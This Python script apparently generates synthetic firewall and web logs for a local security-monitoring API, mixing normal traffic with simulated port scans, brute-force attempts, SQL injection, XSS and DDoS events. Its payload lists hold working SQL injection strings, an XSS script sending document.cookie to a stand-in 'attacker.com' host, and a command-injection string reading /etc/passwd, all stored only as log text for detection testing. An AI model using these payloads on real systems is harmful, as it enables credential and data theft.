import time
import random
import requests
from datetime import datetime

API_URL = "http://127.0.0.1:8000/api/logs"

# Pools for realistic data generation
NORMAL_IPS = [
    "192.168.1.10", "192.168.1.15", "192.168.1.42", "10.0.0.101",
    "10.0.0.105", "172.16.0.5", "172.16.0.12", "192.168.2.88"
]

ATTACKER_IPS = [
    "45.33.32.156", "185.220.101.5", "193.142.146.210", "103.251.167.20"
]

DESTINATION_IPS = [
    "10.0.0.1", "10.0.0.2", "172.16.100.1"
]

PROTOCOLS = ["TCP", "UDP", "HTTP", "HTTPS"]
COMMON_PORTS = [80, 443, 22, 53, 8080, 3306, 5432]

SQLI_PAYLOADS = [
    "GET /api/v1/users?id=1 UNION SELECT username, password FROM admin_users",
    "POST /login - body: username=' OR '1'='1' --&password=secret",
    "GET /product?cat=books' OR 1=1--"
]

XSS_PAYLOADS = [
    "POST /comments - body: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>",
    "GET /search?q=<svg/onload=alert('XSS')>"
]

CMDI_PAYLOADS = [
    "GET /ping?host=127.0.0.1; cat /etc/passwd",
    "POST /upload - cmd.exe /c dir"
]

def generate_normal_log():
    src_ip = random.choice(NORMAL_IPS)
    dest_ip = random.choice(DESTINATION_IPS)
    proto = random.choice(PROTOCOLS)
    dest_port = random.choice(COMMON_PORTS)
    src_port = random.randint(1024, 65535)
    bytes_tx = random.randint(120, 15000)
    
    actions = ["ALLOW", "ALLOW", "ALLOW", "BLOCK"]
    action = random.choice(actions)

    messages = [
        f"{proto} connection established to port {dest_port}",
        f"GET /index.html HTTP/1.1 200 OK",
        f"POST /api/data HTTP/1.1 200 OK",
        f"DNS Query resolved for api.domain.internal",
        f"TLS 1.3 Handshake completed successfully"
    ]

    return {
        "timestamp": datetime.utcnow().isoformat(),
        "source_ip": src_ip,
        "destination_ip": dest_ip,
        "source_port": src_port,
        "destination_port": dest_port,
        "protocol": proto,
        "action": action,
        "bytes_transferred": bytes_tx,
        "message": random.choice(messages)
    }

def send_log(log_payload):
    try:
        res = requests.post(API_URL, json=log_payload, timeout=2.0)
        return res.status_code == 200
    except Exception as e:
        print(f"Error sending log: {e}")
        return False

def simulate_port_scan():
    attacker = random.choice(ATTACKER_IPS)
    target = random.choice(DESTINATION_IPS)
    ports = [21, 22, 23, 25, 80, 110, 143, 443, 3306, 5432, 8080, 27017]
    print(f"--> [SIMULATION] Triggering PORT SCAN attack from {attacker}...")
    for p in ports:
        log = {
            "timestamp": datetime.utcnow().isoformat(),
            "source_ip": attacker,
            "destination_ip": target,
            "source_port": random.randint(1024, 65535),
            "destination_port": p,
            "protocol": "TCP",
            "action": "BLOCK",
            "bytes_transferred": 64,
            "message": f"SYN scan attempt on port {p}"
        }
        send_log(log)
        time.sleep(0.05)

def simulate_brute_force():
    attacker = random.choice(ATTACKER_IPS)
    target = random.choice(DESTINATION_IPS)
    print(f"--> [SIMULATION] Triggering BRUTE FORCE attack from {attacker}...")
    for i in range(6):
        log = {
            "timestamp": datetime.utcnow().isoformat(),
            "source_ip": attacker,
            "destination_ip": target,
            "source_port": random.randint(1024, 65535),
            "destination_port": 443,
            "protocol": "HTTPS",
            "action": "BLOCK",
            "bytes_transferred": 320,
            "message": f"POST /api/login 401 Unauthorized - Authentication failed for user admin (Attempt #{i+1})"
        }
        send_log(log)
        time.sleep(0.1)

def simulate_sqli():
    attacker = random.choice(ATTACKER_IPS)
    payload = random.choice(SQLI_PAYLOADS)
    print(f"--> [SIMULATION] Triggering SQL INJECTION attack from {attacker}...")
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "source_ip": attacker,
        "destination_ip": random.choice(DESTINATION_IPS),
        "source_port": random.randint(1024, 65535),
        "destination_port": 80,
        "protocol": "HTTP",
        "action": "BLOCK",
        "bytes_transferred": 850,
        "message": payload
    }
    send_log(log)

def simulate_xss():
    attacker = random.choice(ATTACKER_IPS)
    payload = random.choice(XSS_PAYLOADS)
    print(f"--> [SIMULATION] Triggering XSS attack from {attacker}...")
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "source_ip": attacker,
        "destination_ip": random.choice(DESTINATION_IPS),
        "source_port": random.randint(1024, 65535),
        "destination_port": 443,
        "protocol": "HTTPS",
        "action": "BLOCK",
        "bytes_transferred": 1200,
        "message": payload
    }
    send_log(log)

def simulate_ddos():
    attacker = random.choice(ATTACKER_IPS)
    target = random.choice(DESTINATION_IPS)
    print(f"--> [SIMULATION] Triggering DDoS / TRAFFIC SPIKE from {attacker}...")
    for _ in range(30):
        log = {
            "timestamp": datetime.utcnow().isoformat(),
            "source_ip": attacker,
            "destination_ip": target,
            "source_port": random.randint(1024, 65535),
            "destination_port": 80,
            "protocol": "HTTP",
            "action": "ALLOW",
            "bytes_transferred": 500,
            "message": "GET / HTTP/1.1 200 OK - High frequency request flood"
        }
        send_log(log)
        time.sleep(0.02)

def run_generator():
    print("Starting Real-Time Network Traffic Log Generator...")
    print(f"Sending log stream to {API_URL}")
    counter = 0

    while True:
        # Send 2-5 normal logs
        for _ in range(random.randint(2, 5)):
            log = generate_normal_log()
            send_log(log)
            time.sleep(random.uniform(0.1, 0.4))
            counter += 1

        # Periodically trigger attack scenarios
        if counter > 0 and counter % 25 == 0:
            attack_choice = random.choice(["port_scan", "brute_force", "sqli", "xss", "ddos"])
            if attack_choice == "port_scan":
                simulate_port_scan()
            elif attack_choice == "brute_force":
                simulate_brute_force()
            elif attack_choice == "sqli":
                simulate_sqli()
            elif attack_choice == "xss":
                simulate_xss()
            elif attack_choice == "ddos":
                simulate_ddos()

        time.sleep(0.2)

if __name__ == "__main__":
    run_generator()
